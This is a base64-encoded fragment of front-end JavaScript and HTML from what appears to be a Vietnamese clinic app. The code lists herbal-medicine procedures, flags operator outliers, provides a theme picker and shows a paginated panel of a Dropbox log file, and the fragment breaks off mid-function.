Z2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyTW9kYWwnKTsNCiAgY29uc3QgbW9kYWxCb2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJPdXRsaWVyTW9kYWxCb2R5Jyk7DQogIGNvbnN0IG1vZGFsSW5mbyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllck1vZGFsSW5mbycpOw0KICBjb25zdCBvbmx5RXJyb3JEYXlzQ2IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0hlcmJFcnJvckRheXNDaGVja2JveCcpOw0KDQogIHRib2R5LmlubmVySFRNTCA9ICcnOw0KDQogIGNvbnN0IGhlcmJzUmF3ID0gd2luZG93LmFsbEhlcmJQcm9jZWR1cmVzIHx8IFtdOw0KICBsZXQgaGVyYnMgPSBoZXJic1Jhdy5tYXAoaD0+KHsNCiAgICAuLi5oLA0KICAgIG9wQ2xlYW46IGNsZWFuRGlzcGxheShoLm9wZXJhdG9yKSwNCiAgICBvcE5vcm06IG5vcm0oaC5vcGVyYXRvcikNCiAgfSkpOw0KDQogIC8vIG7hur91IGNoZWNrYm94IGLhuq10IHRow6wgbOG7jWMgbOG6oWkgaGVyYnMgY2jhu4kgY8OybiBuaOG7r25nIG5nw6B5IGPDsyBs4buXaQ0KICBpZihvbmx5RXJyb3JEYXlzQ2IgJiYgb25seUVycm9yRGF5c0NiLmNoZWNrZWQpew0KICAgIGNvbnN0IGVycm9yRGF0ZXMgPSBnZXRIZXJiRXJyb3JEYXRlcyhoZXJicyk7DQogICAgaGVyYnMgPSBoZXJicy5maWx0ZXIoaCA9PiBlcnJvckRhdGVzLmluY2x1ZGVzKGguZGF0ZSkpOw0KICAgIGlmKHN1bW1hcnlEaXYpew0KICAgICAgaWYoZXJyb3JEYXRlcy5sZW5ndGgpew0KICAgICAgICBzdW1tYXJ5RGl2LnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICBzdW1tYXJ5RGl2LmlubmVySFRNTCA9IGA8Yj7EkGFuZyBoaeG7g24gdGjhu4sgY8OhYyBuZ8OgeSBjw7MgbOG7l2kgc+G6r2MgdGh14buRYzo8L2I+ICR7ZXJyb3JEYXRlcy5qb2luKCcsICcpfWA7DQogICAgICB9IGVsc2Ugew0KICAgICAgICBzdW1tYXJ5RGl2LnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIHN1bW1hcnlEaXYuaW5uZXJIVE1MID0gJyc7DQogICAgICB9DQogICAgfQ0KICB9DQoNCiAgLy8ga2jhu59pIHThuqFvIHNlbGVjdCBu4bq/dSBjaMawYQ0KICBpZighZGF0ZUZpbHRlci5kYXRhc2V0LmluaXRpYWxpemVkKXsNCiAgICBjb25zdCB1bmlxdWVEYXRlcyA9IFsuLi5uZXcgU2V0KGhlcmJzLm1hcChoPT5oLmRhdGUpKV0uc29ydCgoYSxiKT0+ew0KICAgICAgY29uc3QgW2RhLG1hLHlhXSA9IGEuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgIGNvbnN0IFtkYixtYix5Yl0gPSBiLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICByZXR1cm4gbmV3IERhdGUoeWEsbWEtMSxkYSkgLSBuZXcgRGF0ZSh5YixtYi0xLGRiKTsNCiAgICB9KTsNCiAgICBjb25zdCB1bmlxdWVEb2N0b3JzID0gWy4uLm5ldyBTZXQoaGVyYnMubWFwKGg9PmguZG9jdG9yfHwnS2jDtG5nIGPDsycpKV0uc29ydCgpOw0KICAgIGRhdGVGaWx0ZXIuaW5uZXJIVE1MID0NCiAgICAgICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsNCiAgICAgIHVuaXF1ZURhdGVzLm1hcChkPT5gPG9wdGlvbiB2YWx1ZT0iJHtkfSI+JHtkfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIGRvY3RvckZpbHRlci5pbm5lckhUTUwgPQ0KICAgICAgJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6oyBiw6FjIHPEqTwvb3B0aW9uPicgKw0KICAgICAgdW5pcXVlRG9jdG9ycy5tYXAoZD0+YDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICBkYXRlRmlsdGVyLmRhdGFzZXQuaW5pdGlhbGl6ZWQgPSAndHJ1ZSc7DQogICAgZGF0ZUZpbHRlci5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCB3aW5kb3cucmVuZGVySGVyYkxpc3QpOw0KICAgIGRvY3RvckZpbHRlci5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCB3aW5kb3cucmVuZGVySGVyYkxpc3QpOw0KICAgIGlmKG9ubHlFcnJvckRheXNDYil7DQogICAgICBvbmx5RXJyb3JEYXlzQ2IuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgd2luZG93LnJlbmRlckhlcmJMaXN0KTsNCiAgICB9DQogIH0NCg0KICBjb25zdCBzZWxlY3RlZERhdGUgPSBkYXRlRmlsdGVyLnZhbHVlOw0KICBjb25zdCBzZWxlY3RlZERvY3RvciA9IGRvY3RvckZpbHRlci52YWx1ZTsNCg0KICBjb25zdCBmaWx0ZXJlZCA9IGhlcmJzLmZpbHRlcihwID0+DQogICAgKHNlbGVjdGVkRGF0ZSA9PT0gJ2FsbCcgfHwgcC5kYXRlID09PSBzZWxlY3RlZERhdGUpICYmDQogICAgKHNlbGVjdGVkRG9jdG9yID09PSAnYWxsJyB8fCBwLmRvY3RvciA9PT0gc2VsZWN0ZWREb2N0b3IpDQogICk7DQoNCiAgaWYoZmlsdGVyZWQubGVuZ3RoID09PSAwKXsNCiAgICBjb25zdCB0ciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgdHIuY2xhc3NOYW1lID0gJ2hlcmItcm93JzsNCiAgICB0ci5pbm5lckhUTUwgPSAnPHRkIGNvbHNwYW49IjUiPjxjZW50ZXI+S2jDtG5nIGPDsyBk4buvIGxp4buHdSBz4bqvYyB0aHXhu5FjIHRoYW5nPC9jZW50ZXI+PC90ZD4nOw0KICAgIHRib2R5LmFwcGVuZENoaWxkKHRyKTsNCiAgICBpZihzdW1tYXJ5RGl2KSBzdW1tYXJ5RGl2LnN0eWxlLmRpc3BsYXk9J25vbmUnOw0KICAgIHJldHVybjsNCiAgfQ0KDQogIGNvbnN0IG1ham9yaXR5ID0gY29tcHV0ZU1ham9yaXR5QnlEYXRlKGhlcmJzKTsNCiAgY29uc3Qgb3V0bGllcnNJblZpZXcgPSBbXTsNCg0KICBmaWx0ZXJlZC5mb3JFYWNoKHA9PnsNCiAgICBjb25zdCB0ciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgdHIuY2xhc3NOYW1lID0gJ2hlcmItcm93JzsNCiAgICBjb25zdCBtID0gbWFqb3JpdHlbcC5kYXRlXTsNCiAgICBjb25zdCBoYXNNYWpvcml0eSA9IG0gJiYgbS50b3BOb3JtICYmIG0udG9wQ291bnQgPiBtLnNlY29uZENvdW50Ow0KICAgIGlmKGhhc01ham9yaXR5ICYmIHAub3BOb3JtICE9PSBtLnRvcE5vcm0pew0KICAgICAgdHIuY2xhc3NMaXN0LmFkZCgnaGVyYi1vdXRsaWVyJyk7DQogICAgICBvdXRsaWVyc0luVmlldy5wdXNoKHApOw0KICAgIH0NCiAgICB0ci5pbm5lckhUTUwgPSBgDQogICAgICA8dGQ+JHtwLnBhdGllbnROYW1lfSBbPGZvbnQgY29sb3I9InJlZCI+JHtwLnBhdGllbnRBZ2V9PC9mb250Pl08YnIvPiR7cC5wYXRpZW50SWR9PC90ZD4NCiAgICAgIDx0ZD4ke3AucHJvY2VkdXJlfTwvdGQ+DQogICAgICA8dGQ+JHtwLmRhdGV9PC90ZD4NCiAgICAgIDx0ZD4ke3AuZGlzcGxheVN0YXJ0fSAmcmFycjsgJHtwLmRpc3BsYXlFbmR9PC90ZD4NCiAgICAgIDx0ZD4ke3Aub3BDbGVhbn08L3RkPg0KICAgIGA7DQogICAgdGJvZHkuYXBwZW5kQ2hpbGQodHIpOw0KICB9KTsNCg0KICBpZihzdW1tYXJ5RGl2ICYmICghb25seUVycm9yRGF5c0NiIHx8ICFvbmx5RXJyb3JEYXlzQ2IuY2hlY2tlZCkpew0KICAgIGlmKG91dGxpZXJzSW5WaWV3Lmxlbmd0aCl7DQogICAgICBzdW1tYXJ5RGl2LnN0eWxlLmRpc3BsYXk9J2Jsb2NrJzsNCiAgICAgIHN1bW1hcnlEaXYuaW5uZXJIVE1MID0NCiAgICAgICAgYDxhIGhyZWY9IiMiIGlkPSJoZXJiT3V0bGllckNvdW50TGluayI+Q8OzICR7b3V0bGllcnNJblZpZXcubGVuZ3RofSBjYSBjw7MgduG6pW4gxJHhu4EgdHJvbmcgZGFuaCBzw6FjaCBuw6B5LjwvYT5gOw0KICAgICAgY29uc3QgbGluayA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllckNvdW50TGluaycpOw0KICAgICAgbGluay5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uKGV2KXsNCiAgICAgICAgZXYucHJldmVudERlZmF1bHQoKTsNCiAgICAgICAgaWYobW9kYWxCb2R5KXsNCiAgICAgICAgICBtb2RhbEJvZHkuaW5uZXJIVE1MID0gJyc7DQogICAgICAgICAgb3V0bGllcnNJblZpZXcuZm9yRWFjaChwPT57DQogICAgICAgICAgICBjb25zdCB0ciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgICAgICB0ci5pbm5lckhUTUwgPSBgDQogICAgICAgICAgICAgIDx0ZD4ke3AucGF0aWVudE5hbWV9IFs8Zm9udCBjb2xvcj0icmVkIj4ke3AucGF0aWVudEFnZX08L2ZvbnQ+XTxici8+JHtwLnBhdGllbnRJZH08L3RkPg0KICAgICAgICAgICAgICA8dGQ+JHtwLnByb2NlZHVyZX08L3RkPg0KICAgICAgICAgICAgICA8dGQ+JHtwLmRhdGV9PC90ZD4NCiAgICAgICAgICAgICAgPHRkPiR7cC5kaXNwbGF5U3RhcnR9ICZyYXJyOyAke3AuZGlzcGxheUVuZH08L3RkPg0KICAgICAgICAgICAgICA8dGQ+JHtwLm9wQ2xlYW59PC90ZD4NCiAgICAgICAgICAgIGA7DQogICAgICAgICAgICBtb2RhbEJvZHkuYXBwZW5kQ2hpbGQodHIpOw0KICAgICAgICAgIH0pOw0KICAgICAgICB9DQogICAgICAgIGlmKG1vZGFsSW5mbyl7DQogICAgICAgICAgY29uc3Qgbm90ZURhdGUgPSAoc2VsZWN0ZWREYXRlPT09J2FsbCcpID8gJ25oaeG7gXUgbmfDoHknIDogc2VsZWN0ZWREYXRlOw0KICAgICAgICAgIG1vZGFsSW5mby50ZXh0Q29udGVudCA9IGBU4buVbmcgJHtvdXRsaWVyc0luVmlldy5sZW5ndGh9IGNhIGtow6FjIMSRYSBz4buRICgke25vdGVEYXRlfSkuYDsNCiAgICAgICAgfQ0KICAgICAgICBpZihtb2RhbCkgbW9kYWwuc3R5bGUuZGlzcGxheT0nYmxvY2snOw0KICAgICAgfSwge29uY2U6dHJ1ZX0pOw0KICAgIH0gZWxzZSB7DQogICAgICBzdW1tYXJ5RGl2LnN0eWxlLmRpc3BsYXk9J25vbmUnOw0KICAgICAgc3VtbWFyeURpdi5pbm5lckhUTUw9Jyc7DQogICAgfQ0KICB9DQp9Ow0KDQoNCiAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsICgpPT57DQogICAgY29uc3QgdGFibGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYlByb2NlZHVyZVRhYmxlJyk7DQogICAgaWYodGFibGUgJiYgdGFibGUuc3R5bGUuZGlzcGxheSAhPT0gJ25vbmUnKXsNCiAgICAgIHdpbmRvdy5yZW5kZXJIZXJiTGlzdCgpOw0KICAgIH0NCiAgfSk7DQp9KSgpOw0KDQoNCg0KDQo8L3NjcmlwdD4NCjxzY3JpcHQ+DQogIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoIkRPTUNvbnRlbnRMb2FkZWQiLCBmdW5jdGlvbiAoKSB7DQogICAgY29uc3QgZmlsZUlucHV0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpOw0KICAgIGNvbnN0IGFuYWx5emVCdG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYW5hbHl6ZUJ0bicpOw0KICAgIGlmIChmaWxlSW5wdXQgJiYgYW5hbHl6ZUJ0bikgew0KICAgICAgZmlsZUlucHV0LmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uICgpIHsNCiAgICAgICAgYW5hbHl6ZUJ0bi5jbGljaygpOw0KICAgICAgfSk7DQogICAgfQ0KICB9KTsNCjwvc2NyaXB0Pg0KDQoNCjwhLS0gVEhFTUUgUElDS0VSIFNDUklQVCAtLT4NCjxzY3JpcHQ+DQooZnVuY3Rpb24oKXsNCiAgY29uc3QgVEhFTUVfS0VZID0gJ3VpQWNjZW50VGhlbWUnOw0KICBjb25zdCBib2R5ID0gZG9jdW1lbnQuYm9keTsNCiAgY29uc3QgcGlja2VyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RoZW1lUGlja2VyJyk7DQogIGlmKCFwaWNrZXIpIHJldHVybjsNCiAgZnVuY3Rpb24gYXBwbHlUaGVtZSh0KXsNCiAgICBib2R5LmNsYXNzTGlzdC5yZW1vdmUoJ3RoZW1lLWRlZmF1bHQnLCd0aGVtZS1vcmFuZ2UnLCd0aGVtZS1yZWQnLCd0aGVtZS1ncmVlbicpOw0KICAgIGlmKHQgJiYgdCAhPT0gJ2RlZmF1bHQnKXsNCiAgICAgIGJvZHkuY2xhc3NMaXN0LmFkZCgndGhlbWUtJyt0KTsNCiAgICB9IGVsc2Ugew0KICAgICAgYm9keS5jbGFzc0xpc3QuYWRkKCd0aGVtZS1kZWZhdWx0Jyk7IC8vIGV4cGxpY2l0IMSR4buDIGFjdGl2ZSByaW5nDQogICAgfQ0KICAgIHBpY2tlci5xdWVyeVNlbGVjdG9yQWxsKCcudGhlbWUtc3dhdGNoJykuZm9yRWFjaChidG49PnsNCiAgICAgIGJ0bi5jbGFzc0xpc3QudG9nZ2xlKCdpcy1hY3RpdmUnLCBidG4uZGF0YXNldC50aGVtZT09PXQgfHwgKHQ9PT0nJyAmJiBidG4uZGF0YXNldC50aGVtZT09PSdkZWZhdWx0JykpOw0KICAgIH0pOw0KICAgIHRyeXsgbG9jYWxTdG9yYWdlLnNldEl0ZW0oVEhFTUVfS0VZLHR8fCdkZWZhdWx0Jyk7IH1jYXRjaChlKXt9DQogIH0NCiAgY29uc3Qgc2F2ZWQgPSAoZnVuY3Rpb24oKXt0cnl7cmV0dXJuIGxvY2FsU3RvcmFnZS5nZXRJdGVtKFRIRU1FX0tFWSkgfHwgJ2RlZmF1bHQnO31jYXRjaChlKXtyZXR1cm4gJ2RlZmF1bHQnO319KSgpOw0KICBhcHBseVRoZW1lKHNhdmVkKTsNCiAgcGlja2VyLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJyxlPT57DQogICAgY29uc3QgYnRuID0gZS50YXJnZXQuY2xvc2VzdCgnLnRoZW1lLXN3YXRjaCcpOw0KICAgIGlmKCFidG4pIHJldHVybjsNCiAgICBhcHBseVRoZW1lKGJ0bi5kYXRhc2V0LnRoZW1lKTsNCiAgfSk7DQp9KSgpOw0KPC9zY3JpcHQ+DQoNCjxzY3JpcHQ+DQpmdW5jdGlvbiB1cGRhdGVIZXJiQnV0dG9uV2l0aE91dGxpZXJDb3VudCgpIHsNCiAgY29uc3QgYnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJUb2dnbGVCdG4nKTsNCiAgaWYgKCFidG4gfHwgIXdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcykgcmV0dXJuOw0KDQogIGNvbnN0IGhlcmJzID0gd2luZG93LmFsbEhlcmJQcm9jZWR1cmVzOw0KICBjb25zdCBjb3VudHMgPSB7fTsNCg0KICBoZXJicy5mb3JFYWNoKGggPT4gew0KICAgIGNvbnN0IGRhdGUgPSBoLmRhdGU7DQogICAgY29uc3Qga2V5ID0gZGF0ZTsNCiAgICBpZiAoIWNvdW50c1trZXldKSBjb3VudHNba2V5XSA9IHt9Ow0KICAgIGNvbnN0IG5hbWUgPSAoaC5vcGVyYXRvciB8fCAnS2jDtG5nIGPDsycpLnRyaW0oKS50b0xvd2VyQ2FzZSgpOw0KICAgIGNvdW50c1trZXldW25hbWVdID0gKGNvdW50c1trZXldW25hbWVdIHx8IDApICsgMTsNCiAgfSk7DQoNCiAgbGV0IG91dGxpZXJDb3VudCA9IDA7DQoNCiAgT2JqZWN0LmtleXMoY291bnRzKS5mb3JFYWNoKGRhdGUgPT4gew0KICAgIGNvbnN0IG9wcyA9IGNvdW50c1tkYXRlXTsNCiAgICBjb25zdCBlbnRyaWVzID0gT2JqZWN0LmVudHJpZXMob3BzKS5zb3J0KChhLCBiKSA9PiBiWzFdIC0gYVsxXSk7DQogICAgY29uc3QgdG9wID0gZW50cmllc1swXTsNCiAgICBpZiAoIXRvcCkgcmV0dXJuOw0KDQogICAgY29uc3QgdG9wTmFtZSA9IHRvcFswXTsNCiAgICBjb25zdCB0b3BDb3VudCA9IHRvcFsxXTsNCg0KICAgIGZvciAoY29uc3QgW25hbWUsIGNvdW50XSBvZiBlbnRyaWVzKSB7DQogICAgICBpZiAobmFtZSAhPT0gdG9wTmFtZSAmJiBjb3VudCA+IDApIHsNCiAgICAgICAgb3V0bGllckNvdW50ICs9IGNvdW50Ow0KICAgICAgfQ0KICAgIH0NCiAgfSk7DQoNCmJ0bi5pbm5lckhUTUwgPSBgU+G6r2MgdGh14buRYyB0aGFuZyA8aSBjbGFzcz0iZmEtc29saWQgZmEtdHJpYW5nbGUtZXhjbGFtYXRpb24iIHN0eWxlPSJjb2xvcjp5ZWxsb3ciPjwvaT4gPHNwYW4gc3R5bGU9ImNvbG9yOnllbGxvdzsgZm9udC13ZWlnaHQ6Ym9sZCI+KCR7b3V0bGllckNvdW50fSk8L3NwYW4+YDsNCg0KDQp9DQo8L3NjcmlwdD4NCjxkaXYgaWQ9ImRyb3Bib3hQYW5lbCIgc3R5bGU9ImRpc3BsYXk6bm9uZTsgcG9zaXRpb246Zml4ZWQ7IGluc2V0OjA7IGJhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjUpOyB6LWluZGV4Ojk5OTk7Ij4NCiAgPGRpdiBjbGFzcz0ic2FjdGh1b2N0aGFuZyI+DQogICA8ZGl2IHN0eWxlPSJkaXNwbGF5OiBmbGV4OyBqdXN0aWZ5LWNvbnRlbnQ6IHNwYWNlLWJldHdlZW47IGFsaWduLWl0ZW1zOiBjZW50ZXI7Ij4NCiAgPGgzPvCfk4IgRGFuaCBzw6FjaCBLaG9hIMSRw6Mgc+G7rSBk4bulbmcgcGjhuqduIG3hu4FtPC9oMz4NCiAgPGJ1dHRvbiBjbGFzcz0iYnRuIm9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94UGFuZWwnKS5zdHlsZS5kaXNwbGF5PSdub25lJyJzdHlsZT0icGFkZGluZzo4cHggMTRweDsgZm9udC1zaXplOjEzcHg7IGJvcmRlci1yYWRpdXM6NHB4OyI+DQogICAgxJDDs25nDQogIDwvYnV0dG9uPg0KPC9kaXY+DQo8IS0tIFBhZ2luYXRpb24gY29udHJvbHMgLS0+DQo8ZGl2IGlkPSJkcm9wYm94UGFnZXIiIHN0eWxlPSJkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDo4cHg7anVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW47bWFyZ2luLXRvcDoxMnB4Ij4NCiAgPGRpdj4NCiAgICBIaeG7g24gdGjhu4sNCiAgICA8c2VsZWN0IGlkPSJkcm9wYm94UGFnZVNpemUiIHN0eWxlPSJwYWRkaW5nOjZweCA4cHg7Ym9yZGVyOjFweCBzb2xpZCAjZGRkO2JvcmRlci1yYWRpdXM6NnB4Ij4NCiAgICAgIDxvcHRpb24gdmFsdWU9IjEwIiBzZWxlY3RlZD4xMDwvb3B0aW9uPg0KICAgICAgPG9wdGlvbiB2YWx1ZT0iMjAiPjIwPC9vcHRpb24+DQogICAgICA8b3B0aW9uIHZhbHVlPSI1MCI+NTA8L29wdGlvbj4NCiAgICA8L3NlbGVjdD4NCiAgICBkw7JuZyAvIHRyYW5nDQogIDwvZGl2Pg0KDQogIDxkaXYgaWQ9ImRyb3Bib3hQYWdlQnV0dG9ucyIgc3R5bGU9ImRpc3BsYXk6ZmxleDtnYXA6NnB4O2ZsZXgtd3JhcDp3cmFwIj48L2Rpdj4NCg0KICA8ZGl2IGlkPSJkcm9wYm94UGFnZUluZm8iIHN0eWxlPSJtaW4td2lkdGg6MTcwcHg7dGV4dC1hbGlnbjpyaWdodCI+PC9kaXY+DQo8L2Rpdj4NCiAgICA8dGFibGUgYm9yZGVyPSIxIiBjZWxscGFkZGluZz0iOCIgc3R5bGU9IndpZHRoOjEwMCU7IGJvcmRlci1jb2xsYXBzZTpjb2xsYXBzZTsgZm9udC1zaXplOjE0cHgiPg0KICAgICAgPHRoZWFkPg0KICAgICAgICA8dHI+DQogICAgICAgICAgPHRoPlNUVDwvdGg+DQogICAgICAgICAgPHRoPlTDqm4ga2hvYTwvdGg+DQogICAgICAgICAgPHRoPk5nw6B5PC90aD4NCiAgICAgICAgICA8dGg+U+G6r2MgdGh14buRYzwvdGg+DQogICAgICAgICA8dGg+U2FpIHRo4budaSBnaWFuPC90aD4NCiAgICAgICA8dGg+VHLDuW5nIGdp4budPC90aD4NCiAgICAgICANCiAgICAgICAgICA8dGg+VGjhu51pIGdpYW48L3RoPg0KCQkgIDx0aD5MaW5rPC90aD4NCgkJICA8dGg+WG/DoTwvdGg+DQogICAgICAgIDwvdHI+DQogICAgICA8L3RoZWFkPg0KICAgICAgPHRib2R5IGlkPSJkcm9wYm94RmlsZUxpc3QiPjwvdGJvZHk+DQogICAgPC90YWJsZT4NCiAgDQogIDwvZGl2Pg0KPC9kaXY+PHNjcmlwdD4NCmFzeW5jIGZ1bmN0aW9uIHNob3dEcm9wYm94UGFuZWwoKSB7DQphd2FpdCBlbnN1cmVEcm9wYm94KCk7IC8vIMSR4bqjbSBi4bqjbyBjw7MgRHJvcGJveCBTREsNCg0KICBjb25zdCBhY2Nlc3NUb2tlbiA9IGF3YWl0IGdldEFjY2Vzc1Rva2VuKCk7DQogIGNvbnN0IGRieCA9IG5ldyBEcm9wYm94LkRyb3Bib3goeyBhY2Nlc3NUb2tlbiB9KTsNCiAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveEZpbGVMaXN0Jyk7DQoNCiAgLy8gSGnhu4duIHBvcHVwIG5nYXkgbOG6rXAgdOG7qWMgduG7m2kgdHLhuqFuZyB0aMOhaSBsb2FkaW5nDQogIHRib2R5LmlubmVySFRNTCA9IGA8dHI+PHRkIGNvbHNwYW49IjkiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlcjsgY29sb3I6Ymx1ZTsiPg0KICAgIMSQYW5nIHThuqNpIGThu68gbGnhu4d1Li4uDQogIDwvdGQ+PC90cj5gOw0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveFBhbmVsJykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQoNCiAgdHJ5IHsNCiAgICAvLyAxKSBLaeG7g20gdHJhIHThu5NuIHThuqFpIGxvZy5qc29uDQogICAgbGV0IGhhc0xvZyA9IGZhbHNlOw0KICAgIGxldCByZXMgPSBhd2FpdCBkYnguZmlsZXNMaXN0Rm9sZGVyKHsgcGF0aDogJy90aHV0aHVhdCcgfSk7DQogICAgd2hpbGUgKHRydWUpIHsNCiAgICAgIGlmIChyZXMucmVzdWx0Py5lbnRyaWVzPy5zb21lKGUgPT4gZVsnLnRhZyddID09PSAnZmlsZScgJiYgZS5uYW1lID09PSAnbG9nLmpzb24nKSkgew0KICAgICAgICBoYXNMb2cgPSB0cnVlOw0KICAgICAgICBicmVhazsNCiAgICAgIH0NCiAgICAgIGlmICghcmVzLnJlc3VsdD8uaGFzX21vcmUpIGJyZWFrOw0KICAgICAgcmVzID0gYXdhaXQgZGJ4LmZpbGVzTGlzdEZvbGRlckNvbnRpbnVlKHsgY3Vyc29yOiByZXMucmVzdWx0LmN1cnNvciB9KTsNCiAgICB9DQoNCiAgICAvLyAyKSBO4bq/dSBraMO0bmcgY8OzIGZpbGUg4oaSIGPhuq1wIG5o4bqtdCBu4buZaSBkdW5nDQogICAgaWYgKCFoYXNMb2cpIHsNCiAgICAgIHRib2R5LmlubmVySFRNTCA9IGA8dHI+PHRkIGNvbHNwYW49IjYiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlcjsgY29sb3I6cmVkOyI+DQogICAgICAgIEtow7RuZyBjw7MgZGFuaCBzw6FjaCBuw6BvIMSRxrDhu6NjIGzGsHUNCiAgICAgIDwvdGQ+PC90cj5gOw0KICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIC8vIDMpIEPDsyBmaWxlIOKGkiB04bqjaSB2w6AgaGnhu4NuIHRo4buLDQogICAgY29uc3QgZGwgPSBhd2FpdCBkYnguZmlsZXNEb3dubG9hZCh7IHBhdGg6ICcvdGh1dGh1YXQvbG9nLmpzb24nIH0pOw0KICAgIGNvbnN0IHRleHQgPSBhd2FpdCBkbC5yZXN1bHQuZmlsZUJsb2IudGV4dCgpOw0KICAgIGxldCBsb2dzID0gW107DQogICAgdHJ5IHsgbG9ncyA9IEpTT04ucGFyc2UodGV4dCk7IH0gY2F0Y2ggeyBsb2dzID0gW107IH0NCg0KICAgIGlmICghbG9ncy5sZW5ndGgpIHsNCiAgICAgIHRib2R5LmlubmVySFRNTCA9IGA8dHI+PHRkIGNvbHNwYW49IjYiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlcjsgY29sb3I6cmVkOyI+DQogICAgICAgIEtow7RuZyBjw7MgZGFuaCBzw6FjaCBuw6BvIMSRxrDhu6NjIGzGsHUNCiAgICAgIDwvdGQ+PC90cj5gOw0KICAgIH0gZWxzZSB7DQogY29uc3QgY3VycmVudFVzZXIgPSAoc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnbWVkVXNlcicpIHx8ICcnKS50b0xvd2VyQ2FzZSgpOw0KDQovLyBSZW5kZXIgbeG7m2kg4oCTIGdpYW8gY2hvIGLhu5kgcGjDom4gdHJhbmc6DQpEQl9MT0dTID0gbG9nczsgLy8gbeG6o25nIGThu68gbGnhu4d1IMSR4bqneSDEkeG7pw0KREJfUEFHRSA9IDE7ICAgIC8vIHbhu4EgdHJhbmcgMSBt4buXaSBraGkgbeG7nyBwYW5lbA0KREJfQ1VSUkVOVF9VU0VSID0gKHNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ21lZFVzZXInKSB8fCAnJykudG9Mb3dlckNhc2UoKTsNCg0KYXR0YWNoUGFnZXJFdmVudHNPbmNlKCk7IC8vIGfhuq9uIGNoYW5nZSBjaG8gc2VsZWN0IHBhZ2Ugc2l6ZSAoY2jhu4kgMSBs4bqnbikNCnJlbmRlckRyb3Bib3hQYWdlKCk7ICAgICAvLyB24bq9IHRib2R5ICsgbsO6dCB0cmFuZyB04burIERCX0xPR1MNCiAgICB9DQogIH0gY2F0Y2ggKGVycikgew0KICAgIGNvbnNvbGUuZXJyb3IoJ0zhu5dpIGtoaSDEkeG7jWMgZGFuaCBzw6FjaCB04burIERyb3Bib3g6JywgZXJyKTsNCiAgICB0Ym9keS5pbm5lckhUTUwgPSBgPHRyPjx0ZCBjb2xzcGFuPSI2IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7IGNvbG9yOnJlZDsiPg0KICAgICAgS2jDtG5nIHRo4buDIHThuqNpIGThu68gbGnhu4d1DQogICAgPC90ZD48L3RyPmA7DQogIH0NCn0NCihmdW5jdGlvbigpew0KICBjb25zdCBwYWdlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94UGFnZXInKTsNCiAgaWYgKHBhZ2VyICYmICFwYWdlci5kYXRhc2V0LmJvdW5kKSB7DQogICAgcGFnZXIuZGF0YXNldC5ib3VuZCA9ICcxJzsNCiAgICBwYWdlci5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGUgPT4gZS5zdG9wUHJvcGFnYXRpb24oKSk7DQogICAgcGFnZXIuYWRkRXZlbnRMaXN0ZW5lcignbW91c2Vkb3duJywgZSA9PiBlLnN0b3BQcm9wYWdhdGlvbigpKTsNCiAgfQ0KfSkoKTsNCg0KPC9zY3JpcHQ+DQoNCg0KDQo8c2NyaXB0Pg0KZnVuY3Rpb24gdmVyaWZ5QW5kT3BlbkxpbmsodXJsKSB7DQoNCg0KICAvLyBPdmVybGF5IHThu5FpIChjbGljayB2w6BvIHPhur0gdOG6r3QpDQogIGNvbnN0IG92ZXJsYXkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdka